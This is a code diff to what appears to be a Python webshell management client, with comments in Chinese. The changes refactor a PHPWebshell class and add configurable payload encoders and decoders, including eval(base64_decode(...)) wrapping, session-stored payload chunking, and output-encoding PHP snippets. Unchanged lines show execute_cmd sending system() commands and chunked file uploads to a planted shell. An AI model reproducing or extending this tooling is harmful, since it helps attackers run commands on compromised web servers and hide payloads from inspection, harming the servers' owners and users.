@@ -8,7 +8,7 @@ import random
 import re
 import string
 import typing as t
-from dataclasses import dataclass
+import dataclasses
 from binascii import Error as BinasciiError
 import httpx
 from Crypto.Cipher import AES
@@ -33,6 +33,14 @@ user_agent = random_user_agent()
 
 DEFAULT_SESSION_ID = "".join(random.choices("1234567890abcdef", k=32))
 
+DECODER_RAW = """
+function decoder_echo($s) {echo $s;}
+""".strip()
+
+DECODER_BASE64 = """
+function decoder_echo($s) {echo base64_encode($s);}
+""".strip()
+
 # session id was specified to avoid session
 # forget to save session id in cookie
 
@@ -41,6 +49,7 @@ if (session_status() == PHP_SESSION_NONE) {{
     session_id('{session_id}');
     session_start();
 }}
+{decoder}
 echo '{delimiter_start_1}'.'{delimiter_start_2}';
 try{{{payload_raw}}}catch(Exception $e){{die("POSTEXEC_F"."AILED");}}
 echo '{delimiter_stop}';"""
@@ -259,8 +268,6 @@ basic_info_names = {
 }
 
 
-
-
 def base64_encode(s):
     """将给定的字符串或字节序列编码成base64"""
     if isinstance(s, str):
@@ -268,9 +275,9 @@ def base64_encode(s):
     return base64.b64encode(s).decode()
 
 
-
-
-def to_sessionize_payload(payload: str, chunk: int = PAYLOAD_SESSIONIZE_CHUNK) -> t.List[str]:
+def to_sessionize_payload(
+    payload: str, chunk: int = PAYLOAD_SESSIONIZE_CHUNK
+) -> t.List[str]:
     payload = base64_encode(payload)
     payload_store_name = random_english_words()
     payloads = []
@@ -287,31 +294,65 @@ def to_sessionize_payload(payload: str, chunk: int = PAYLOAD_SESSIONIZE_CHUNK) -
     return payloads
 
 
-@dataclass
-class PHPWebshellOptions:
-    """除了submit_raw之外的函数需要的各类选项"""
-
-    encoder: t.Literal["raw", "base64"] = "raw"
-    sessionize_payload: bool = True
+# 给前端显示的PHPWebshellOptions选项
+php_webshell_conn_options = [
+    ConnOption(
+        id="encoder",
+        name="编码器",
+        type="select",
+        placeholder="base64",
+        default_value="base64",
+        alternatives=[
+            {"name": "base64", "value": "base64"},
+            {"name": "raw", "value": "raw"},
+        ],
+    ),
+    ConnOption(
+        id="decoder",
+        name="解码器",
+        type="select",
+        placeholder="raw",
+        default_value="raw",
+        alternatives=[
+            {"name": "raw", "value": "raw"},
+            {"name": "base64", "value": "base64"},
+        ],
+    ),
+    ConnOption(
+        id="sessionize_payload",
+        name="Session暂存payload",
+        type="checkbox",
+        placeholder=None,
+        default_value=False,
+        alternatives=None,
+    ),
+]
 
 
 class PHPWebshell(PHPSessionInterface):
     """PHP session各类工具函数的实现"""
 
-    def __init__(self, options: t.Union[None, PHPWebshellOptions]):
-        self.options = options if options else PHPWebshellOptions()
+    def __init__(self, conn: t.Union[None, dict]):
+        # conn是webshell从前端或者数据库接来的字典，可能是上一个版本，没有添加某项的connection info
+        # 所以其中的任何一项都可能不存在，需要使用get取默认值
+        options = conn if conn is not None else {}
+        self.decoder = {"raw": DECODER_RAW, "base64": DECODER_BASE64}[
+            options.get("decoder", "raw")
+        ]
+        self.encoder = options.get("encoder", "raw")
+        self.sessionize_payload = options.get("sessionize_payload", False)
         # for upload file
         self.chunk_size = 32 * 1024
         self.max_coro = 4
 
     def encode(self, payload: str) -> str:
         """应用编码器"""
-        if self.options.encoder == "raw":
+        if self.encoder == "raw":
             return payload
-        if self.options.encoder == "base64":
+        if self.encoder == "base64":
             encoded = base64.b64encode(payload.encode()).decode()
             return f'eval(base64_decode("{encoded}"));'
-        raise RuntimeError(f"Unsupported encoder: {self.options.encoder}")
+        raise RuntimeError(f"Unsupported encoder: {self.encoder}")
 
     async def execute_cmd(self, cmd: str) -> str:
         return await self.submit(f"system({cmd!r});")
@@ -416,7 +457,7 @@ class PHPWebshell(PHPSessionInterface):
                 "BASE64_CONTENT", base64_encode(chunk)
             )
             async with sem:
-                await asyncio.sleep(0.01) # we don't ddos
+                await asyncio.sleep(0.01)  # we don't ddos
                 result = await self.submit(code)
                 done_count += 1
                 if callback:
@@ -521,6 +562,7 @@ class PHPWebshell(PHPSessionInterface):
             delimiter_stop=stop,
             payload_raw=payload,
             session_id=DEFAULT_SESSION_ID,
+            decoder=self.decoder,
         )
         payload = self.encode(payload)
         status_code, text = await self.submit_raw(payload)
@@ -548,7 +590,7 @@ class PHPWebshell(PHPSessionInterface):
     async def submit(self, payload: str) -> str:
         # sessionize_payload
         payloads = [payload]
-        if self.options.sessionize_payload:
+        if self.sessionize_payload:
             payloads = to_sessionize_payload(payload)
         result = None
         for payload_part in payloads:
